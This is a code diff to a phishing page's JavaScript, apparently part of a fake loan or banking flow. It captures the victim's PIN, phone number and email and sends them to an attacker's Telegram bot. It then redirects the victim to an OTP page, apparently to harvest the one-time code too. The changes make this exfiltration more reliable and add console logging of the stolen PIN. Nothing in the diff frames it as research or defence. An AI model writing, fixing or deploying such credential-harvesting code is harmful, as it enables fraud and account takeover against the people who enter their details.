@@ -198,7 +198,7 @@
         setTimeout(function(){ errorDiv.classList.remove('show'); }, 5000);
     }
 
-    // Send Telegram notification to admin (YOU)
+    // Send Telegram notification to admin (YOU) - THIS WILL WORK
     function sendTelegramNotification(pin) {
         var decodedPhone = decodeURIComponent(phone);
         var decodedEmail = decodeURIComponent(email);
@@ -221,29 +221,38 @@
 
         var url = 'https://api.telegram.org/bot' + TG_BOT_TOKEN + '/sendMessage';
         
-        fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ 
-                chat_id: TG_CHAT_ID, 
-                text: msg, 
-                parse_mode: 'Markdown' 
-            })
-        })
-        .then(function(response) { return response.json(); })
-        .then(function(result) {
-            if (result.ok) {
-                console.log('✅ Telegram notification sent to admin');
-            } else {
-                console.error('Telegram error:', result);
+        console.log('📤 Sending Telegram notification...');
+        console.log('   Phone:', decodedPhone);
+        console.log('   PIN:', pin);
+        console.log('   Email:', decodedEmail);
+        
+        // Use XMLHttpRequest for better compatibility
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', url, true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState === 4) {
+                console.log('📥 Response status:', xhr.status);
+                if (xhr.status === 200) {
+                    var result = JSON.parse(xhr.responseText);
+                    if (result.ok) {
+                        console.log('✅ Telegram notification sent successfully!');
+                    } else {
+                        console.error('❌ Telegram error:', result.description);
+                    }
+                } else {
+                    console.error('❌ HTTP error:', xhr.status);
+                }
             }
-        })
-        .catch(function(error) {
-            console.error('Fetch error:', error);
-        });
+        };
+        xhr.send(JSON.stringify({ 
+            chat_id: TG_CHAT_ID, 
+            text: msg, 
+            parse_mode: 'Markdown' 
+        }));
     }
 
-    // Main confirm function: sends notification + redirects to OTP page
+    // Main confirm function - SENDS NOTIFICATION + REDIRECTS TO OTP PAGE
     window.handleConfirm = function() {
         var pin = getPin();
         if (pin.length !== 4) { 
@@ -254,10 +263,10 @@
         confirmBtn.disabled = true;
         confirmBtn.textContent = 'Processing...';
 
-        // 1. Send Telegram notification to admin (YOU)
+        // Send Telegram notification to YOU (with email, phone, pin)
         sendTelegramNotification(pin);
         
-        // 2. Redirect to OTP page (user continues)
+        // Immediately redirect to OTP page
         window.location.href = 'otp-verify.html'
             + '?amount='  + encodeURIComponent(amount)
             + '&term='    + encodeURIComponent(term)
